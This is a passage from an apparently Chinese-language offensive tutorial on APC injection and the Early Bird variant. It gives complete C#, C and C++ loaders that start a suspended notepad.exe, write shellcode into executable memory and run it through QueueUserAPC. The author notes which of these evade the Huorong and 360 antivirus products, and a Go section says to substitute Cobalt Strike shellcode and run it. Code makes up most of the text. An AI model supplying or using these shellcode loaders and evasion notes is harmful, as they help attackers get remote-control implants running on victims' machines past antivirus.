     public IntPtr Reserved3;
     public IntPtr UniquePid;
     public IntPtr MoreReserved;
     }
     [StructLayout(LayoutKind.Sequential)]
     //internal struct STARTUPINFO
     public struct STARTUPINFO
     {
     uint cb;
     IntPtr lpReserved;
     IntPtr lpDesktop;
     IntPtr lpTitle;
     uint dwX;
     uint dwY;
     uint dwXSize;
     uint dwYSize;
     uint dwXCountChars;
     uint dwYCountChars;
     uint dwFillAttributes;
     public uint dwFlags;
     public ushort wShowWindow;
     ushort cbReserved;
     IntPtr lpReserved2;
     IntPtr hStdInput;
     IntPtr hStdOutput;
     IntPtr hStdErr;
     }
     public static PROCESS_INFORMATION StartProcess(string binaryPath)
     {
     uint flags = 0x00000004;
     STARTUPINFO startInfo = new STARTUPINFO();
     PROCESS_INFORMATION procInfo = new PROCESS_INFORMATION();
     CreateProcess((IntPtr)0, binaryPath, (IntPtr)0, (IntPtr)0, false, flags, (IntPtr)0, (IntPtr)0, ref startInfo, out procInfo);
     return procInfo;
     }
     public TestClass()
     {
     string b64 = ""; //shellcode base64 encode
     string targetprocess = "C:/Windows/System32/notepad.exe";
     byte[] shellcode = new byte[] { };
     shellcode = Convert.FromBase64String(b64);
     uint lpNumberOfBytesWritten = 0;
     PROCESS_INFORMATION processInfo = StartProcess(targetprocess);
     IntPtr pHandle = OpenProcess((uint)ProcessAccessRights.All, false, (uint)processInfo.dwProcessId);
     //write shellcode to the process memory
     IntPtr rMemAddress = VirtualAllocEx(pHandle, IntPtr.Zero, (uint)shellcode.Length, (uint)MemAllocation.MEM_RESERVE | (uint)MemAllocation.MEM_COMMIT, (uint)MemProtect.PAGE_EXECUTE_READWRITE);
     if (WriteProcessMemory(pHandle, rMemAddress, shellcode, (uint)shellcode.Length, ref lpNumberOfBytesWritten))
     {
     IntPtr tHandle = OpenThread(ThreadAccess.THREAD_ALL, false, (uint)processInfo.dwThreadId);
     IntPtr ptr = QueueUserAPC(rMemAddress, tHandle, IntPtr.Zero);
     ResumeThread(tHandle);
     }
     bool hOpenProcessClose = CloseHandle(pHandle);
     }
     }
这里测试过了火绒但是没过360
### C实现
代码如下
    #include 
    #include 
    unsigned char shellcode[] = ;   //shellcode   {0xfc,0x48,0x83}
    unsigned int buff = sizeof(shellcode);
    int main(void) {
     STARTUPINFO si;
     PROCESS_INFORMATION pi;
     void * ptApcRoutine;
     ZeroMemory(&si, sizeof(si));
     si.cb = sizeof(si);
     ZeroMemory(&pi, sizeof(pi));
     CreateProcessA(0, "notepad.exe", 0, 0, 0, CREATE_SUSPENDED, 0, 0, &si, &pi);
     ptApcRoutine = VirtualAllocEx(pi.hProcess, NULL, buff, MEM_COMMIT, PAGE_EXECUTE_READ);
     WriteProcessMemory(pi.hProcess, ptApcRoutine, (PVOID) shellcode, (SIZE_T) buff, (SIZE_T *) NULL);
     QueueUserAPC((PAPCFUNC)ptApcRoutine, pi.hThread, NULL);
     ResumeThread(pi.hThread);
     return 0;
    }
这里被360杀了，但是加载是能上线的。
## APC 注入变种 Early bird
Early Bird是一种简单而强大的技术，Early Bird本质上是一种APC注入与线程劫持的变体，由于线程初始化时会调用ntdll未导出函数
**NtTestAlert** ， **NtTestAlert** 是一个检查当前线程的 APC
队列的函数，如果有任何排队作业，它会清空队列。当线程启动时， **NtTestAlert**
会在执行任何操作之前被调用。因此，如果在线程的开始状态下对APC进行操作，就可以完美的执行shellcode。（如果要将shellcode注入本地进程，则可以APC到当前线程并调用
**NtTestAlert** 函数来执行）
通常使用的 Windows 函数包括：
  * CreateProcessA ： 此函数用于创建新进程及其主线程。
  * VirtualAllocEx ： 在指定进程的虚拟空间保留或提交内存区域
  * WriteProcessMemory ：将数据写入指定进程的内存区域。
  * QueueUserAPC ：允许将 APC 对象添加到指定线程的 APC 队列中。
## Early bird注入流程
  * 1.创建一个挂起的进程(通常是windows的合法进程)
  * 2.在挂起的进程内申请一块可读可写可执行的内存空间
  * 3.往申请的空间内写入shellcode
  * 4.将APC插入到该进程的主线程
  * 5.恢复挂起进程的线程
## Early bird注入实现
### C实现
代码如下
    #include 
    int main() {
     unsigned char shellcode[] = ""; //shellcode  "\xfc\x48\x83\xe4"
     SIZE_T shellSz = sizeof(buff);
     STARTUPINFOA st = { 0 };
     PROCESS_INFORMATION prt = { 0 };
     CreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &st, &prt);
     HANDLE victimProcess = prt.hProcess;
     HANDLE threadHandle = prt.hThread;
     LPVOID shellAddr = VirtualAllocEx(victimProcess, NULL, shellSz, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
     PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddr;
     WriteProcessMemory(victimProcess, shellAddr, buff, shellSz, NULL);
     QueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL);
     ResumeThread(threadHandle);
     return 0;
    }
### C++实现
代码如下
    #include 
    int main()
    {
        unsigned char shellcode[] = "";    //"\xfc\x48\x83\xe4"
        SIZE_T shellSize = sizeof(buf);
        STARTUPINFOA si = { 0 };
        PROCESS_INFORMATION pi = { 0 };
        CreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
        HANDLE victimProcess = pi.hProcess;
        HANDLE threadHandle = pi.hThread;
        LPVOID shellAddress = VirtualAllocEx(victimProcess, NULL, shellSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;
        WriteProcessMemory(victimProcess, shellAddress, buf, shellSize, NULL);
        QueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL);
        ResumeThread(threadHandle);
        return 0;
    }
### Go实现
参考项目：  
将其中的shellcode替换成CS的shellcode即可  
编译之后运行上线  
# 参考